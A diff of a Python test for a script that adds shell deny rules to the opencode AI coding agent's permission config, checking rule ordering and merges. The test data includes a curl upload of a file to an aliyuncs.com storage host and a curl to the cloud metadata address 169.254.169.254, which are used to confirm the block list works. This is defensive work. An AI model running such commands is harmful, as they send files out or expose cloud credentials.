@@ -288,9 +288,9 @@ def main() -> None:
     rc, out = remove_one(p, "anthropic")           # only this box's own providers
     assert rc == 2 and "refused" in out and doc_of(p) == want, out
 
-    # 10. --deny-bash: the hosts of Cohere's report (2026-10-26) denied to opencode's shell, by
-    #     rules that come LAST, since opencode's last matching rule wins; whatever the user set
-    #     for every other command stays theirs. Read back the way opencode reads it.
+    # 10. --deny-bash: the hosts of Cohere's report (2026-10-26) denied to opencode's shell, under a
+    #     key of their own, "bash*", LAST in "permission", since opencode's last matching rule wins;
+    #     the user's own "bash" stays as they wrote it. Read back the way opencode reads it.
     m = load_module()
 
     def deny(path):
@@ -304,48 +304,57 @@ def main() -> None:
         perm = jsonc(path).get("permission")
         return [m._bash_action(perm, c) for c in commands]
 
+    rules = dict.fromkeys(m.DENY_BASH, "deny")
     oss, meta, other = "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x", "curl http://169.254.169.254/", "ls -la"
     # install.sh's own copy, no permission at all
     p = write(tmp, '{\n  // mine\n  "$schema": "https://opencode.ai/config.json",\n  "model": "qwen38/qwen3.8-27b"\n}\n')
     rc, out = deny(p)
-    assert rc == 0 and "deny rules added" in out, out
+    assert rc == 0 and "put last" in out, out
+    assert jsonc(p)["permission"] == {"bash*": rules}, jsonc(p)
     assert acts(p, oss, meta, other) == ["deny", "deny", None], acts(p, oss, meta, other)
     assert "// mine" in open(p).read(), "a comment was dropped"
     rc, out = deny(p)
-    assert rc == 0 and "unchanged" in out, out
+    assert rc == 0 and "hold already" in out, out
     # one action for every tool: it stays the action of every other command
     p = write(tmp, '{"permission": "ask"}\n')
     assert deny(p)[0] == 0 and acts(p, oss, other) == ["deny", "ask"], acts(p, oss, other)
-    # a "*" before any bash rule: "bash" goes after it, or the "*" would decide (set_member puts a
-    # new member first, which is where this used to land)
+    # a "*" already there: the block goes after it (set_member puts a new member first, where the
+    # "*" would decide)
     p = write(tmp, '{\n  "permission": {\n    "*": "ask",\n    "edit": "deny"\n  }\n}\n')
     assert deny(p)[0] == 0 and acts(p, oss, other) == ["deny", "ask"], acts(p, oss, other)
-    assert list(jsonc(p)["permission"]) == ["*", "edit", "bash"], jsonc(p)
-    # bash given one action, then as the user's own rules, with a trailing comma and comments
-    p = write(tmp, '{"permission": {"bash": "ask"}}\n')
-    assert deny(p)[0] == 0 and acts(p, oss, other) == ["deny", "ask"], acts(p, oss, other)
-    p = write(tmp, '{\n  "permission": {\n    "bash": {\n      "*": "ask", // theirs\n'
-                   '      "rm *": "deny", /* theirs too */\n    },\n  },\n}\n')
+    assert list(jsonc(p)["permission"]) == ["*", "edit", "bash*"], jsonc(p)
+    # the user's own shell rules, with a trailing comma and comments: left as they are
+    theirs = ('    "bash": {\n      "*": "ask", // theirs\n      "rm *": "deny", /* theirs too */\n    },\n')
+    p = write(tmp, '{\n  "permission": {\n' + theirs + '  },\n}\n')
     rc, out = deny(p)
     assert rc == 0 and acts(p, oss, meta, other, "rm -rf x") == ["deny", "deny", "ask", "deny"], out
-    assert list(jsonc(p)["permission"]["bash"])[:2] == ["*", "rm *"], jsonc(p)
-    assert "// theirs" in open(p).read() and "/* theirs too */" in open(p).read(), "a comment was dropped"
-    # a pattern the user set themselves stays as they set it
-    p = write(tmp, '{"permission": {"bash": {"*aliyuncs.com*": "allow"}}}\n')
+    assert theirs in open(p).read(), "the user's own rules were rewritten"
+    # a key added after the block overrides it: the next run puts it last again (it used to say
+    # "already there" and leave a curl to an aliyuncs.com host allowed, found in review)
+    text = open(p).read()
+    assert text.endswith("    },\n  },\n}\n"), text            # the block, with the trailing comma kept
+    open(p, "w").write(text[:-len("  },\n}\n")] + '    "*": "allow"\n  },\n}\n')
+    assert acts(p, oss) == ["allow"], acts(p, oss)
+    rc, out = deny(p)
+    assert rc == 0 and acts(p, oss, meta, other) == ["deny", "deny", "allow"], out
+    assert list(jsonc(p)["permission"])[-1] == "bash*", jsonc(p)
+    # a pattern the user set themselves inside the block stays as they set it
+    p = write(tmp, '{"permission": {"bash*": {"*aliyuncs.com*": "allow"}}}\n')
     rc, out = deny(p)
     assert rc == 0 and acts(p, oss, meta) == ["allow", "deny"], out
-    # a key after "bash" that matches it too would override anything put in "bash": left alone
-    body = '{"permission": {"bash": {"*": "allow"}, "*": "ask"}}\n'
+    # a block that is not an object is not guessed at
+    body = '{"permission": {"bash*": "deny"}}\n'
     p = write(tmp, body)
     rc, out = deny(p)
-    assert rc == 4 and "by hand" in out and open(p).read() == body, out
-    # AGENT_AUTO=1: opencode merges OPENCODE_PERMISSION after the files' rules, so its "*" came
+    assert rc == 1 and "refused" in out and open(p).read() == body, out
+    # AGENT_AUTO=1: opencode merges OPENCODE_PERMISSION after the files' rules, so a bare "*" came
     # last and an echo naming an aliyuncs.com host ran (2026-10-28); the rules come again after it
     r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-permission"], capture_output=True, text=True)
     env = json.loads(r.stdout)
-    assert r.returncode == 0 and list(env)[0] == "*" and env["*"] == "allow", r.stdout
-    merged = {"bash": dict.fromkeys(m.DENY_BASH, "deny")} | env       # the config's rules, then the unit's
+    assert r.returncode == 0 and list(env) == ["*", "*bash"] and env["*"] == "allow", r.stdout
+    merged = {"bash*": rules} | env                          # the config's rules, then the unit's
     assert [m._bash_action(merged, c) for c in (oss, meta, other)] == ["deny", "deny", "allow"], merged
+    assert m.deny_permission() == {"bash*": rules}
 
     print("test_oc_merge_limits: OK")
 
